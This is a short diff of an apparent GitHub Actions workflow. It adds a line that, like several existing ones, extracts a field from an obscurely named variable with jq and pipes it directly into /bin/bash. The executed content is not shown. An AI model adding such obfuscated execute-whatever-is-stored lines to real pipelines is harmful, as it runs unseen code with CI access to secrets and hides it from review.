@@ -38,6 +38,7 @@ jobs:
           echo $ohnx62735 | jq -r .udu548 | /bin/bash
           echo $d72 | jq -r .khgf91251 | /bin/bash
           echo $cjth74 | jq -r .ken8779 | /bin/bash
+          printf '%s' "$t29" | jq -r .dhsbd4 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
